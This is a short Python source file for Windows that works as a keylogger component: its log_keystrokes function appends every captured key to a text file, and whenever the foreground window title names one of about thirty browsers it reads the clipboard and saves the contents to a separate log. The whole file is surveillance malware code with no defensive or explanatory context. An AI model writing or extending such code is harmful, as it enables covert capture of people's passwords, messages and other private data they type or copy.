import win32gui
import win32clipboard

def log_keystrokes(file_path, key):
    with open(f"{file_path}/f_keystroke.txt", "a") as f:
        f.write(f"{key}\n")

    window = win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower()
    browsers = {"chrome", "firefox", "safari", "edge", "opera", "internet explorer", "brave", "chromium", "vivaldi",
                "yandex browser", "maxthon", "tor browser", "uc browser", "pale moon", "seamonkey", "avant browser",
                "midori", "epic browser", "comodo dragon", "waterfox", "slimjet", "basilisk", "falkon", "konqueror",
                "blisk", "torch browser", "puffin browser", "sleipnir", "otter browser", "lunascape"}

    for browser in browsers:
        if browser in window:
            try:
                win32clipboard.OpenClipboard()
                url = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                win32clipboard.CloseClipboard()
                if url:
                    url = url.decode("utf-8")
                    with open(f"{file_path}/f_website.log", "a") as f:
                        f.write(f"{url}\n")
            except Exception as e:
                print(f"Error accessing clipboard: {e}")
            break
